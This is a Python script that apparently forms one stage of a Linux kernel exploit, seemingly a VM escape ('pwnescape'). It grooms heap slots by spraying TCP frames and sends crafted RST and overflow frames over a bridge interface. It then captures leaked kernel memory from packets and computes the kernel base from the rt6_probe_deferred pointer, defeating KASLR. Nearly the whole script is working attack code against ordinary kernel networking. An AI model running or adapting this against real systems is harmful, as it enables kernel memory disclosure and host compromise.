#!/usr/bin/env python3
# Host orchestrator for the guest-visible 255B-window self-check.
# Read-only: 0x4000 read payload only; no work-field writes, no fire.
# usage: r6selfcheck.py pos|neg <n> <gw>
import os, sys, time, struct, socket, subprocess
sys.path.insert(0, "/tmp")
import r6read as R
R.LOG = "/tmp/r6new/obs-selfcheck.log"

RT6_OFF = 0x10cbfd0
HEAP_LO = 0xffff888000000000
HEAP_HI = 0xffffc87fffffffff
TEXT_LO = 0xffffffff80000000
TEXT_HI = 0xffffffffc0000000
LOG = "/tmp/r6new/obs-selfcheck.log"


def sh(c, to=30):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def selfcheck(win, gw):
    data, nxt, prv, func = struct.unpack("<4Q", win[32:64])
    target = win[64:80]
    pwq = data & ~0xff
    kbase = (func - RT6_OFF) & 0xffffffffffffffff
    queued = ((data & 0x5) == 0x5) and (data >> 48) == 0xffff and (pwq & 0xff) == 0
    links = nxt == prv and HEAP_LO <= nxt <= HEAP_HI and (nxt & 0x3f) != 0x08
    func_ok = TEXT_LO <= func <= TEXT_HI
    kbase_ok = (kbase & 0x1fffff) == 0 and 0xffffffff80000000 <= kbase <= 0xffffffffc0000000
    w_eq = (target[:2] == b"\xfe\x80" and target[2:14] == b"\0" * 12
            and target[14:16] == struct.pack(">H", gw))
    rr = win[0] == 7 and win[1] == 11
    return dict(data=data, next=nxt, prev=prv, func=func, pwq=pwq, kbase=kbase,
                target=target, queued=queued, links=links, func_ok=func_ok,
                kbase_ok=kbase_ok, w_eq=w_eq, rr=rr,
                passed=queued and links and func_ok and kbase_ok and w_eq and rr)


def show(tag, r, win):
    print("%s data=%#x next=%#x prev=%#x func=%#x pwq=%#x target=%s "
          "queued=%s w_eq_v64=%s links=%s kbase=%#x kbase_ok=%s rr=%s PASS=%s" %
          (tag, r["data"], r["next"], r["prev"], r["func"], r["pwq"],
           r["target"].hex(), r["queued"], r["w_eq"], r["links"], r["kbase"],
           r["kbase_ok"], r["rr"], r["passed"]), flush=True)


def capture(port, timeout=0.8, cap=None):
    if cap is None:
        cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        cap.bind(("virbr-pwn", 0))
        cap.setblocking(False)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            fr = cap.recv(65535)
        except BlockingIOError:
            time.sleep(0.002); continue
        except Exception:
            continue
        off = 14
        if len(fr) < 34: continue
        et = struct.unpack(">H", fr[12:14])[0]
        while et in (0x8100, 0x88a8) and len(fr) >= off + 4:
            et = struct.unpack(">H", fr[off + 2:off + 4])[0]; off += 4
        if et != 0x0800: continue
        ip = fr[off:]
        if len(ip) < 295 or ip[9] != 6: continue
        if bytes(ip[12:16]) != R.DST4 or bytes(ip[16:20]) != R.SRC4: continue
        t = 20 + 255
        if struct.unpack(">H", ip[t:t + 2])[0] != 7778: continue
        if struct.unpack(">H", ip[t + 2:t + 4])[0] != port: continue
        return bytes(ip[20:275])
    return None


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "pos"
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 40
    gw = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x7f00
    os.sched_setaffinity(0, {7})
    rt6 = R.ksym("rt6_probe_deferred")
    print("SELFCHECK-RUN mode=%s n=%d gw=%#x rt6=%#x" % (mode, n, gw, rt6), flush=True)

    # route: pos = site N (nexthop object); neg = site E (plain)
    sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % gw)
    sh("ip nexthop del id %d 2>/dev/null" % (30000 + (gw & 0xffff)))
    if mode == "pos":
        sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (30000 + (gw & 0xffff), gw))
        sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (gw, 30000 + (gw & 0xffff)))
    else:
        sh("ip -6 route replace fd01:0:%x::/64 via fe80::%x dev virbr-pwn" % (gw, gw))
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % gw)
    print("aging 11.6s", flush=True)
    time.sleep(11.6)

    sh("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
    time.sleep(0.2)
    open(LOG, "w").close()
    obs = subprocess.Popen(["/opt/pwnescape/tools/r6obs", "%x" % rt6, "40"],
                           stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(80):
        if "READY" in open(LOG, errors="ignore").read():
            break
        time.sleep(0.1)

    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = R.sock()
    cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    cap.bind(("virbr-pwn", 0))
    cap.setblocking(False)
    base = 58000 + (int(time.time()) % 200)
    seqbase = 0x58000000 + (int(time.time()) & 0xfff) * 256
    sports = set(range(base, base + n))
    for i in range(n):
        s.send(R.frame(base + i, (seqbase + i) & 0xffffffff))
    time.sleep(0.15)

    q, e, x = R.parse_obs()
    slots = {ev["sport"]: ev["dopt"] - 16 for ev in e if ev["sport"] in sports}
    if len(slots) < 10:
        print("ABORT few victims %d" % len(slots)); obs.terminate(); return 1
    pages = {}
    for sp, a in slots.items():
        pages.setdefault(a & ~0xfff, []).append((sp, a))
    last = max((ev for ev in e if ev["sport"] in sports), key=lambda ev: ev["ts"])
    page = (last["dopt"] - 16) & ~0xfff
    a2s = {a: sp for sp, a in slots.items()}
    triples = []
    for sp, a in pages.get(page, []):
        if a - 64 in a2s and a + 64 in a2s:
            triples.append((a - 64, a, a + 64))
    triples.sort(key=lambda t: a2s[t[2]], reverse=True)
    if not triples:
        print("ABORT no triple"); obs.terminate(); return 1
    B, V, W = triples[0]
    sb, sv, sw = a2s[B], a2s[V], a2s[W]
    seqv = (seqbase + (sv - base)) & 0xffffffff
    seqw = (seqbase + (sw - base)) & 0xffffffff
    ov_sp = 48200 + (int(time.time()) % 100)
    fr_w = R.frame(sw, (seqw + 1) & 0xffffffff, rst=True)
    fr_b = R.frame(sb, (seqbase + (sb - base) + 1) & 0xffffffff, rst=True)
    fr_ov = R.frame(ov_sp, 0x63000000, wire=0x4000, payload=R.read_payload())
    fr_dup = R.frame(sv, seqv)
    print("TRIPLE B=%#x(%d) V=%#x(%d) W=%#x(%d) ovs=%d" %
          (B, sb, V, sv, W, sw, ov_sp), flush=True)

    kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
    for t in kws:
        sh("chrt -i -p 0 %s 2>/dev/null" % t)

    old = os.sched_getscheduler(0)
    try:
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(50))
        s.send(fr_w); R.probe6(gw, s6); s.send(fr_b); s.send(fr_ov); s.send(fr_dup)
    finally:
        os.sched_setscheduler(0, old, os.sched_param(0))
    w1 = capture(sv, cap=cap)
    print("FIRST_WINDOW %s" % (len(w1) if w1 else None), flush=True)
    if w1:
        show("HOSTSELF-FIRST", selfcheck(w1, gw), w1)

    # let the work execute, then sample the same V again (post state)
    time.sleep(1.5)
    try:
        s.send(fr_dup)
    except Exception:
        pass
    w2 = capture(sv, cap=cap)
    print("POST_WINDOW %s" % (len(w2) if w2 else None), flush=True)
    if w2:
        show("HOSTSELF-POST", selfcheck(w2, gw), w2)

    for t in kws:
        sh("chrt -o -p 0 %s 2>/dev/null" % t)
    time.sleep(0.3)
    obs.terminate()
    q, e, x = R.parse_obs()
    qw = [ev for ev in q if ev["work"] == W]
    ew = [ev for ev in e if ev["sport"] == ov_sp]
    xw = [ev for ev in x if ev["work"] == W]
    print("VALIDATION QUEUE_work_eq_W=%s (%s) ECHO_dopt_eq_B=%s (%s) EXEC_func=%s" %
          (bool(qw), hex(qw[-1]["data"]) if qw else None,
           bool(ew) and ew[-1]["dopt"] - 16 == B,
           hex(ew[-1]["dopt"]) if ew else None,
           hex(xw[-1]["func"]) if xw else None), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
